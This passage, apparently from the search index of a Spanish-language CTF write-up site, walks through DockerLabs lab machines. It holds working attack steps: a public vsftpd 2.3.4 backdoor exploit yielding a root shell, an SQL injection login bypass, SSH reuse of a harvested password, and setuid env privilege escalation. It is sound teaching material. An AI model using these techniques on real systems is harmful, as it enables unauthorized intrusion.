la m\u00e1quina vulnerable, espere un momento.\n\nM\u00e1quina desplegada, su direcci\u00f3n IP es -\u2192 172.17.0.2\n\nPresiona Ctrl+C cuando termines con la m\u00e1quina para eliminarla\n</code></pre> <p>Una vez desplegada, creamos la carpeta firsthacking, nos metemos dentro y usamos la utilidad mkt que nos crea las carpetas nmap, content, exploits y scripts.</p> <pre><code>\u276f mkdir firsthacking-dockerlabs\n\u276f cd firsthacking-dockerlabs\n\u276f mkt\n\u276f ls -l\ndrwxrwxr-x godack godack 4.0 KB Thu Aug 14 19:20:29 2025 content\ndrwxrwxr-x godack godack 4.0 KB Thu Aug 14 19:20:29 2025 exploits\ndrwxrwxr-x godack godack 4.0 KB Thu Aug 14 19:20:29 2025 nmap\ndrwxrwxr-x godack godack 4.0 KB Thu Aug 14 19:20:29 2025 scripts\n</code></pre>"},{"location":"es/writeups/FirstHacking/#reconocimiento","title":"Reconocimiento","text":"<p>Lo primero que realizamos es un reconocimiento general con nmap sobre la m\u00e1quina v\u00edctima, para obtener los puertos abiertos. </p> <pre><code>\u276f nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts\n\nPORT   STATE SERVICE REASON\n21/tcp open  ftp     syn-ack ttl 64\n</code></pre> <p>Una vez obtenemos los puertos abiertos, realizamos un escaneo mas exhaustivo mediante scripts de reconocimiento para obtener los servicios de cada puerto y la versi\u00f3n en la que corren</p> <pre><code>\u276f extractPorts allPorts\n[*] Extracting information...\n\n     [*] IP Address: 172.17.0.2\n     [*] Open ports: 21\n\n[*] Ports copied to clipboard\n\n\u276f nmap -sCV -p21 172.17.0.2 -oN targeted\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-14 19:17 CEST\nNmap scan report for 172.17.0.2\nHost is up (0.00018s latency).\n\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 2.3.4\nMAC Address: 02:42:AC:11:00:02 (Unknown)\nService Info: OS: Unix\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 2.71 seconds\n</code></pre> <p>De esta manera descubrimos que el servicio que est\u00e1 corriendo en el puerto 21 (puerto FTP) es el vsftpd versi\u00f3n 2.3.4.</p>"},{"location":"es/writeups/FirstHacking/#explotacion","title":"Explotaci\u00f3n","text":"<p>Una vez hecho el reconocimiento de puertos y servicios, nos damos cuenta que al buscar con searchsploit el servicio vsftpd con la versi\u00f3n 2.3.4 en searchsploit es un servicio vulnerable.</p> <pre><code>\u276f searchsploit vsftpd 2.3.4\n-------------------------------------------------------- ---------------------------------\n Exploit Title                                          |  Path\n-------------------------------------------------------- ---------------------------------\nvsftpd 2.3.4 - Backdoor Command Execution               | unix/remote/49757.py\nvsftpd 2.3.4 - Backdoor Command Execution (Metasploit)  | unix/remote/17491.rb\n-------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n</code></pre> <p>De esta manera, buscamos en github exploits para esta vulnerabilidad, y nos encontramos con este repositori, nos lo descargamos y lo ejecutamos (https://github.com/Hellsender01/vsftpd_2.3.4_Exploit).</p> <pre><code>\u276f cd exploits\n\u276f git clone https://github.com/Hellsender01/vsftpd_2.3.4_Exploit.git\n\u276f cd vsftpd_2.3.4_Exploit\n\u276f sudo python3 -m pip install pwntools\n\u276f python3 exploit.py 172.17.0.2\n[+] Got Shell!!!\n[+] Opening connection to 172.17.0.2 on port 21: Done\n[*] Closed connection to 172.17.0.2 port 21\n[+] Opening connection to 172.17.0.2 on port 6200: Done\n[*] Switching to interactive mode\n$ whoami\nroot\n$  \n</code></pre> <p>Y ya tenemos acceso a la m\u00e1quina y sin escalada de privilegios porque ya somos el usuario root!!</p>"},{"location":"es/writeups/FirstHacking/#lecciones-vistas","title":"Lecciones vistas","text":"<ol> <li>Escaneos con nmap</li> <li>Uso de searchsploit</li> <li>Busqueda de exploits en github</li> </ol>"},{"location":"es/writeups/Injection/","title":"Write Up Injection","text":"<p>Dificultad: Super f\u00e1cil Enlace a dockerlabs: https://dockerlabs.es/</p>"},{"location":"es/writeups/Injection/#configuracion-del-entorno","title":"Configuraci\u00f3n del entorno","text":"<p>Primero de todo desplegamos la m\u00e1quina mediante el script que viene al descargar la m\u00e1quina</p> <pre><code>\u276f sudo ./auto_deploy.sh injection.tar\n\nEstamos desplegando la m\u00e1quina vulnerable, espere un momento.\n\nM\u00e1quina desplegada, su direcci\u00f3n IP es -\u2192 172.17.0.2\n\nPresiona Ctrl+C cuando termines con la m\u00e1quina para eliminarla\n</code></pre> <p>Una vez desplegada, creamos la carpeta injection, nos metemos dentro y usamos la utilidad mkt que nos crea las carpetas nmap, content, exploits y scripts.</p> <pre><code>\u276f mkdir injection-dockerlabs\n\u276f cd injection-dockerlabs\n\u276f mkt\n\u276f ls -l\ndrwxrwxr-x godack godack 4.0 KB Fri Aug 15 17:03:20 2025 content\ndrwxrwxr-x godack godack 4.0 KB Fri Aug 15 17:03:20 2025 exploits\ndrwxrwxr-x godack godack 4.0 KB Fri Aug 15 17:03:20 2025 nmap\ndrwxrwxr-x godack godack 4.0 KB Fri Aug 15 17:03:20 2025 scripts\n</code></pre>"},{"location":"es/writeups/Injection/#reconocimiento","title":"Reconocimiento","text":"<p>Lo primero que realizamos es un reconocimiento general con nmap sobre la m\u00e1quina v\u00edctima, para obtener los puertos abiertos. </p> <pre><code>\u276f nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts\n\nPORT   STATE SERVICE REASON\n22/tcp open  ssh     syn-ack ttl 64\n80/tcp open  http    syn-ack ttl 64\n</code></pre> <p>Una vez obtenemos los puertos abiertos, realizamos un escaneo mas exhaustivo mediante scripts de reconocimiento para obtener los servicios de cada puerto y la versi\u00f3n en la que corren</p> <pre><code>\u276f extractPorts allPorts\n[*] Extracting information...\n\n   [*] IP Address: 172.17.0.2\n   [*] Open ports: 22,80\n\n[*] Ports copied to clipboard\n\n\u276f nmap -sCV -p22,80 172.17.0.2 -oN targeted\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-15 17:09 CEST\nNmap scan report for 172.17.0.2\nHost is up (0.000051s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 72:1f:e1:92:70:3f:21:a2:0a:c6:a6:0e:b8:a2:aa:d5 (ECDSA)\n|_  256 8f:3a:cd:fc:03:26:ad:49:4a:6c:a1:89:39:f9:7c:22 (ED25519)\n80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))\n| http-cookie-flags: \n|   /: \n|     PHPSESSID: \n|_      httponly flag not set\n|_http-title: Iniciar Sesi\\xC3\\xB3n\n|_http-server-header: Apache/2.4.52 (Ubuntu)\nMAC Address: 02:42:AC:11:00:02 (Unknown)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 7.31 seconds\n</code></pre> <p>De esta manera descubrimos que el servicio que est\u00e1 corriendo en el puerto 22 (puerto FTP) es el OpenSSH 8.9p1 y en el puerto 80 (puerto http) est\u00e1 corriendo un servicio web Apache httpd 2.4.52.</p>"},{"location":"es/writeups/Injection/#explotacion","title":"Explotaci\u00f3n","text":"<p>Como hemos visto que hay un servicio web corriendo en la m\u00e1quina v\u00edctima procedemos a ver la web, a\u00f1adiendo el dominio (en este caso no tiene y simplemente pondremos el nombre de la m\u00e1quina) al archivo /etc/hosts de nuestra m\u00e1quina virtual (es el archivo de configuraci\u00f3n de DNS local).</p> <pre><code>\u276f sudo vi /etc/hosts\n\u276f cat /etc/hosts\n127.0.0.1   localhost\n127.0.1.1   kali\n\n172.17.0.2  injection\n\n# The following lines are desirable for IPv6 capable hosts\n::1     localhost ip6-localhost ip6-loopback\nff02::1 ip6-allnodes\nff02::2 ip6-allrouters\n</code></pre> <p>Una vez configurado el archivo /etc/hosts procedemos a acceder a la p\u00e1gina web, y vemos que es un formulario de login.</p> <p></p> <p>Probamos a introducir los par\u00e1metros b\u00e1sicos para comprobar si hay inyecci\u00f3n SQL. Para ello hay que introducir la cadena admin' OR '1' = '1'; -- en el apartado de usuario y cualquier cosa en password (en mi caso he puesto hacked!) para que deje enviar el formulario, y si todo va bien, podremos entrar siendo los administradores (si no va con el usuario admin se puede ir cambiando a root, administrator, y cosas parecidas, pero sin perder mucho el tiempo).</p> <pre><code>User: admin' OR '1' = '1'; --\nPassword: hacked!\n</code></pre> <p>Y bingo! Estamos dentro y obtenemos las credenciales de el usuario Dylan</p> <pre><code>Bienvenido Dylan! Has insertado correctamente tu contrase\u00f1a: KJSDFG789FGSDF78\n</code></pre> <p>Al haber obtenido esas credenciales, podemos probar a acceder mediante el puerto ssh tambi\u00e9n abierto.</p> <pre><code>ssh dylan@injection\ndylan@injection's password: (aqu\u00ed ponemos el password)\ndylan@6b329dffcb35:~$ \n</code></pre> <p>Y ya tenemos acceso a la m\u00e1quina!</p>"},{"location":"es/writeups/Injection/#escalada-de-privilegios","title":"Escalada de privilegios","text":"<p>Para poder utilizar la consola de una manera mas c\u00f3moda podemos hacer el siguiente tratamiento de la terminal:</p> <pre><code>script /dev/null -c bash\nstty raw -echo; fg\nreset xterm\nexport TERM=xterm\n</code></pre> <p>Ahora que tenemos una terminal buscamos archivos (a poder ser binarios) con usuario root y el flag setuid activo y encontramos los siguientes:</p> <pre><code>dylan@6b329dffcb35:/bin$ find / -perm -4000 -user root 2&gt;/dev/null\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n/usr/bin/passwd\n/usr/bin/mount\n/usr/bin/gpasswd\n/usr/bin/umount\n/usr/bin/chfn\n/usr/bin/newgrp\n/usr/bin/su\n/usr/bin/env\n/usr/bin/chsh\n</code></pre> <p>As\u00ed que usamos el comando env de la siguiente forma y elevamos privilegios a root</p> <pre><code>dylan@6b329dffcb35:/bin$ ./env /bin/sh -p\n# whoami\nroot\n# \n</code></pre>"},{"location":"es/writeups/Injection/#lecciones-vistas","title":"Lecciones vistas","text":"<ol> <li>Escaneos con nmap</li> <li>Inyecci\u00f3n SQL simple</li> <li>Busqueda de binarios con setuid activo</li> <li>Escalada de privilegios con env</li> </ol>"},{"location":"es/writeups/Obsession/","title":"Write Up Obsession","text":"<p>Dificultad: Super f\u00e1cil Enlace a dockerlabs: https://dockerlabs.es/</p>"},{"location":"es/writeups/Obsession/#configuracion-del-entorno","title":"Configuraci\u00f3n del entorno","text":"<p>Primero de todo desplegamos la m\u00e1quina mediante el script que viene al descargar la m\u00e1quina</p> <pre><code>\u276f chmod +x auto_deploy.sh\n\u276f sudo ./auto_deploy.sh obsession.tar\n[sudo] contrase\u00f1a para godack: \n\n                       ##        .         \n                 ## ## ##       ==         \n              ## ## ## ##      ===         \n          /\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\\___/ ===       \n     ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~\n          \\______ o          __/           \n            \\    \\        __/            \n             \\____\\______/               \n\n  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ \n  |  \\ |  | |    |_/  |___ |__/ |    |__| |__] [__  \n  |__/ |__| |___ | \\_ |___ |  \\ |___ |  | |__] ___] \n\n\n\nEstamos desplegando la m\u00e1quina vulnerable, espere un momento.\n\nM\u00e1quina desplegada, su direcci\u00f3n IP es -\u2192 172.17.0.2\n\nPresiona Ctrl+C cuando termines con la m\u00e1quina para eliminarla\n</code></pre> <p>Una vez desplegada, creamos la carpeta obsession, nos metemos dentro y usamos la utilidad mkt que nos crea las carpetas nmap, content, exploits y scripts.</p> <pre><code>\u276f mkdir obsession-dockerlabs\n\u276f cd obsession-dockerlabs\n\u276f mkt\n\u276f ls -l\ndrwxrwxr-x godack godack 4.0 KB Tue Aug 19 10:06:44 2025 content\ndrwxrwxr-x godack godack 4.0 KB Tue Aug 19 10:06:44 2025 exploits\ndrwxrwxr-x godack godack 4.0 KB Tue Aug 19 10:06:44 2025 nmap\ndrwxrwxr-x godack godack 4.0 KB Tue Aug 19 10:06:44 2025 scripts\n</code></pre>"},{"location":"es/writeups/Obsession/#reconocimiento","title":"Reconocimiento","text":"<p>Para empezar, como siempre, realizaremos un escaneo r\u00e1pido y silencioso sobre la ip de la m\u00e1quina v\u00edctima, para descubrir los puertos abiertos y posteriormente realizar un escaneo mas exhaustivo sobre dichos puertos (de esta manera el escaneo exhaustivo es mas r\u00e1pido porque no lo hacemos sobre todos los puertos, sino por los que hemos descubierto).</p> <pre><code>\u276f nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts\nHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-19 10:11 CEST\nInitiating ARP Ping Scan at 10:11\nScanning 172.17.0.2 [1 port]\nCompleted ARP Ping Scan at 10:11, 0.07s elapsed (1 total hosts)\nInitiating SYN Stealth Scan at 10:11\nScanning 172.17.0.2 [65535 ports]\nDiscovered open port 21/tcp on 172.17.0.2\nDiscovered open port 22/tcp on 172.17.0.2\nDiscovered open port 80/tcp on 172.17.0.2\nCompleted SYN Stealth Scan at 10:11, 1.02s elapsed (65535 total ports)\nNmap scan report for 172.17.0.2\nHost is up, received arp-response (0.0000090s latency).\nScanned at 2025-08-19 10:11:18 CEST for 1s\nNot shown: 65532 closed tcp ports (reset)\nPORT   STATE SERVICE REASON\n21/tcp open  ftp     syn-ack ttl 64\n22/tcp open  ssh     syn-ack ttl 64\n80/tcp open  http    syn-ack ttl 64\n</code></pre> <p>Ahora, mediante la utilidad extractPorts, copiamos los puertos en el portapapeles y realizamos el segundo escaneo</p> <pre><code>\u276f extractPorts allPorts\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n       \u2502 File: extractPorts.tmp\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n   1   \u2502 \n   2   \u2502 [*] Extracting information...\n   3   \u2502 \n   4   \u2502     [*] IP Address: 172.17.0.2\n   5   \u2502     [*] Open ports: 21,22,80\n   6   \u2502 \n   7   \u2502 [*] Ports copied to clipboard\n   8   \u2502 \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u276f nmap -sCV -p21,22,80 172.17.0.2 -oN targeted\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-19 10:12 CEST\nNmap scan report for 172.17.0.2\nHost is up (0.000053s latency).\n\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.5\n| ftp-syst: \n|   STAT: \n| FTP server status:\n|      Connected to ::ffff:172.17.0.1\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 2\n|      vsFTPd 3.0.5 - secure, fast, stable\n|_End of status\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n| -rw-r--r--    1 0        0             667 Jun 18  2024 chat-gonza.txt\n|_-rw-r--r--    1 0        0             315 Jun 18  2024 pendientes.txt\n22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 60:05:bd:a9:97:27:a5:ad:46:53:82:15:dd:d5:7a:dd (ECDSA)\n|_  256 0e:07:e6:d4:3b:63:4e:77:62:0f:1a:17:69:91:85:ef (ED25519)\n80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))\n|_http-server-header: Apache/2.4.58 (Ubuntu)\n|_http-title: Russoski Coaching\n</code></pre> <p>Los puertos que estan abiertos son el puerto FTP (puerto 21), puerto SSH (puerto 22) y puerto HTTP (puerto 80).</p>"},{"location":"es/writeups/Obsession/#explotacion","title":"Explotaci\u00f3n","text":"<p>Como tenemos el puerto FTP abierto, lo primero que haremos es verificar si podemos acceder mediante login anonymous, y vemos que lo permite (el login anonymous es mediante el usuaro <code>anonymous</code> y sin contrase\u00f1a)</p> <pre><code>\u276f ftp obsession\nConnected to obsession.\n220 (vsFTPd 3.0.5)\nName (obsession:godack): anonymous\n331 Please specify the password.\nPassword: \n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\n</code></pre> <p>Al hacer ls vemos que hay dos archivos, chat-gonza.txt y pendientes.txt, as\u00ed que los descargamos y miramos su contenido</p> <pre><code>ftp&gt; ls\n229 Entering Extended Passive Mode (|||34980|)\n150 Here comes the directory listing.\n-rw-r--r--    1 0        0             667 Jun 18  2024 chat-gonza.txt\n-rw-r--r--    1 0        0             315 Jun 18  2024 pendientes.txt\n226 Directory send OK.\nftp&gt; get chat-gonza.txt\nlocal: chat-gonza.txt remote: chat-gonza.txt\n229 Entering Extended Passive Mode (|||11500|)\n150 Opening BINARY mode data connection for chat-gonza.txt (667 bytes).\n100% |*************************************************************************|   667   3.78 MiB/s  00:00 ETA\n226 Transfer complete.\n667 bytes received in 00:00 (713.43 KiB/s)\nftp&gt; get pendientes.txt\nlocal: pendientes.txt remote: pendientes.txt\n229 Entering Extended Passive Mode (|||63348|)\n150 Opening BINARY mode data connection for pendientes.txt (315 bytes).\n100% |*************************************************************************|   315   1.98 MiB/s  00:00 ETA\n226 Transfer complete.\n315 bytes received in 00:00 (465.38 KiB/s)\n</code></pre> <p>Al ver el contenido podemos deducir que hay dos posibles usuarios en la m\u00e1quina v\u00edctima, Gonza y Russoski</p> <pre><code>\u276f cat chat-gonza.txt\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n       \u2502 File: chat-gonza.txt\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n   1   \u2502 [16:21, 16/6/2024] Gonza: pero en serio es tan guapa esa tal N\u00e1gore como dices?\n   2   \u2502 [16:28, 16/6/2024] Russoski: es una aut\u00e9ntica princesa pff, le he hecho hasta un v\u00eddeo y todo, lo tengo ya subido y tengo la URL guardada\n   3   \u2502 [16:29, 16/6/2024] Russoski: en mi ordenador en una ruta segura, ahora cuando quedemos te lo muestro si quieres\n   4   \u2502 [21:52, 16/6/2024] Gonza: buah la verdad ten\u00edas raz\u00f3n eh, es hermosa esa chica, del 9 no baja\n   5   \u2502 [21:53, 16/6/2024] Gonza: por cierto buen entreno el de hoy en el gym, noto los brazos bastante hinchados, as\u00ed s\u00ed\n   6   \u2502 [22:36, 16/6/2024] Russoski: te lo dije, ya sabes que yo tengo buenos gustos para estas cosas xD, y s\u00ed buen training hoy\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u276f cat pendientes.txt\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n       \u2502 File: 